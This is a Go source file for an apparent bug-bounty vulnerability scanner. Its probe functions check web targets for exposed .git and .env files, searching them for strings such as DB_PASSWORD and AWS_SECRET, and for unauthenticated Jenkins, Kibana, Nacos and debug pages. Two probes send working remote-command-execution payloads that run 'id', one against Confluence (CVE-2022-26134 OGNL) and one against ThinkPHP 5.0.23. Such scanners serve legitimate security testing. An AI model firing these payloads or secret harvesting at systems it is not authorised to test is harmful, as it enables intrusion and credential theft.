package bugbounty

import (
	"io"
	"net/http"
	"strings"
)

// Log4Shell - blind JNDI injection detection
func ProbeLog4Shell(base string) *Finding {
	return nil // blind, requires callback server
}

// Dubbo HTTP Invoker
func ProbeDubbo(base string) *Finding {
	_, body, _, err := Get(base + "/")
	if err != nil {
		return nil
	}
	if strings.Contains(body, "dubbo") || strings.Contains(body, "Dubbo") {
		return &Finding{Target: base, Vuln: "CVE-2019-17564 Dubbo HTTP Invoker", Severity: "CRITICAL",
			Detail: "Dubbo service detected", URL: base}
	}
	return nil
}

// .git / .svn / VCS exposure
func ProbeGit(base string) *Finding {
	code, body, _, err := Get(base + "/.git/HEAD")
	if err != nil {
		return nil
	}
	if code == 200 && strings.HasPrefix(strings.TrimSpace(body), "ref: refs/") {
		return &Finding{Target: base, Vuln: ".git Directory Exposed", Severity: "HIGH",
			Detail: "git repo accessible, can leak source code", URL: base + "/.git/HEAD"}
	}
	for _, p := range []string{"/.svn/entries", "/.hg/store/00manifest.i", "/.bzr/branch-format"} {
		code, body, _, err := Get(base + p)
		if err != nil {
			continue
		}
		if code == 200 && len(body) > 10 {
			return &Finding{Target: base, Vuln: "VCS Directory Exposed", Severity: "HIGH",
				Detail: p, URL: base + p}
		}
	}
	return nil
}

// .env / backup file exposure
func ProbeEnv(base string) *Finding {
	secrets := []string{"APP_KEY=", "DB_PASSWORD=", "AWS_SECRET", "SECRET_KEY", "DATABASE_URL=", "MAIL_PASSWORD=", "API_KEY=", "PRIVATE_KEY"}
	paths := []string{"/.env", "/.env.local", "/.env.production", "/.env.bak", "/.env.save", "/config.php", "/wp-config.php.bak", "/config.yml", "/application.yml", "/application-prod.yml"}
	for _, p := range paths {
		code, body, _, err := Get(base + p)
		if err != nil {
			continue
		}
		if code == 200 && len(body) > 20 {
			for _, s := range secrets {
				if strings.Contains(body, s) {
					return &Finding{Target: base, Vuln: "Sensitive Config File Exposed", Severity: "CRITICAL",
						Detail: p + " contains " + s, URL: base + p}
				}
			}
		}
	}
	return nil
}

// CVE-2022-26134 Confluence OGNL
func ProbeConfluence(base string) *Finding {
	_, body, _, err := Get(base + "/")
	if err != nil {
		return nil
	}
	if !strings.Contains(body, "Atlassian Confluence") && !strings.Contains(body, "confluence") {
		return nil
	}
	ognl := `(#a=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec("id").getInputStream(),"utf-8")).(@com.opensymphony.webwork.ServletActionContext@getResponse().setHeader("X-Cmd",#a))`
	enc := strings.ReplaceAll(ognl, "%", "%25")
	enc = strings.ReplaceAll(enc, " ", "%20")
	enc = strings.ReplaceAll(enc, "(", "%28")
	enc = strings.ReplaceAll(enc, ")", "%29")
	enc = strings.ReplaceAll(enc, "@", "%40")
	enc = strings.ReplaceAll(enc, "#", "%23")
	enc = strings.ReplaceAll(enc, ".", "%2e")
	_, _, hdr, err := Get(base + "/${" + enc + "}/")
	if err != nil {
		return nil
	}
	if hdr.Get("X-Cmd") != "" {
		return &Finding{Target: base, Vuln: "CVE-2022-26134 Confluence OGNL RCE", Severity: "CRITICAL",
			Detail: hdr.Get("X-Cmd"), URL: base + "/"}
	}
	return nil
}

// Jenkins
func ProbeJenkins(base string) *Finding {
	code, body, _, err := Get(base + "/script")
	if err != nil {
		return nil
	}
	if code == 200 && strings.Contains(body, "Jenkins") && strings.Contains(body, "script") && !strings.Contains(body, "login") {
		return &Finding{Target: base, Vuln: "Jenkins Script Console No Auth", Severity: "CRITICAL",
			Detail: "Groovy script console accessible without login", URL: base + "/script"}
	}
	code2, body2, _, _ := Get(base + "/asynchPeople/")
	if code2 == 200 && strings.Contains(body2, "Jenkins") && !strings.Contains(body2, "login") {
		return &Finding{Target: base, Vuln: "Jenkins Unauthenticated Access", Severity: "HIGH",
			Detail: "user enumeration via asynchPeople", URL: base + "/asynchPeople/"}
	}
	return nil
}

// Kibana / Elasticsearch
func ProbeKibana(base string) *Finding {
	code, body, _, err := Get(base + "/app/kibana")
	if err != nil {
		return nil
	}
	if code == 200 && strings.Contains(strings.ToLower(body), "kibana") {
		return &Finding{Target: base, Vuln: "Kibana Exposed (No Auth)", Severity: "HIGH",
			Detail: "dashboard accessible without authentication", URL: base + "/app/kibana"}
	}
	_, body2, _, _ := Get(base + "/_cluster/health")
	if strings.Contains(body2, "cluster_name") {
		return &Finding{Target: base, Vuln: "Elasticsearch Exposed (No Auth)", Severity: "HIGH",
			Detail: "_cluster/health accessible", URL: base + "/_cluster/health"}
	}
	return nil
}

// GitLab / Gitea
func ProbeGitPlatform(base string) *Finding {
	code, body, _, err := Get(base + "/users/sign_in")
	if err != nil {
		return nil
	}
	if code == 200 && strings.Contains(body, "GitLab") {
		return &Finding{Target: base, Vuln: "GitLab Instance", Severity: "INFO",
			Detail: "detected", URL: base + "/users/sign_in"}
	}
	_, body3, _, _ := Get(base + "/user/sign_in")
	if strings.Contains(body3, "Gitea") {
		return &Finding{Target: base, Vuln: "Gitea Instance", Severity: "INFO",
			Detail: "detected", URL: base + "/user/sign_in"}
	}
	return nil
}

// Debug endpoints
func ProbeDebug(base string) *Finding {
	paths := map[string]string{
		"/phpinfo.php": "PHP Version", "/info.php": "PHP Version",
		"/server-status": "Apache Server Status", "/server-info": "Apache Server Information",
		"/debug/vars": "cmdline", "/debug/pprof": "pprof",
		"/swagger-ui.html": "swagger", "/v2/api-docs": "swagger",
		"/druid/index.html": "druid", "/actuator/druid": "druid",
	}
	for p, marker := range paths {
		code, body, _, err := Get(base + p)
		if err != nil {
			continue
		}
		if code == 200 && strings.Contains(strings.ToLower(body), strings.ToLower(marker)) {
			sev := "MEDIUM"
			if p == "/druid/index.html" || p == "/actuator/druid" {
				sev = "HIGH"
			}
			return &Finding{Target: base, Vuln: "Debug/Admin Page Exposed", Severity: sev,
				Detail: p, URL: base + p}
		}
	}
	return nil
}

// Nacos
func ProbeNacos(base string) *Finding {
	code, body, _, err := Get(base + "/nacos/v1/auth/users?pageNo=1&pageSize=10")
	if err != nil {
		return nil
	}
	if code == 200 && strings.Contains(body, "username") && strings.Contains(body, "pageItems") {
		return &Finding{Target: base, Vuln: "Nacos Unauthorized User List", Severity: "CRITICAL",
			Detail: "user list accessible without auth", URL: base + "/nacos/v1/auth/users?pageNo=1&pageSize=10"}
	}
	return nil
}

// SkyWalking
func ProbeSkyWalking(base string) *Finding {
	code, body, _, err := Get(base + "/graphql")
	if err != nil {
		return nil
	}
	if code == 200 && strings.Contains(body, "errors") {
		return &Finding{Target: base, Vuln: "SkyWalking GraphQL Exposed", Severity: "MEDIUM",
			Detail: "graphql endpoint accessible", URL: base + "/graphql"}
	}
	return nil
}

// CVE-2018-20062 ThinkPHP 5.0.23 RCE via captcha endpoint
func ProbeThinkPHP(base string) *Finding {
	req, _ := http.NewRequest("POST", base+"/index.php?s=captcha",
		strings.NewReader("_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id"))
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	resp, err := client.Do(req)
	if err != nil {
		return nil
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 2048))
	s := string(body)
	if strings.Contains(s, "uid=") {
		return &Finding{Target: base, Vuln: "CVE-2018-20062 ThinkPHP 5.0.23 RCE", Severity: "CRITICAL",
			Detail: strings.TrimSpace(s)[:200], URL: base + "/index.php?s=captcha"}
	}
	return nil
}
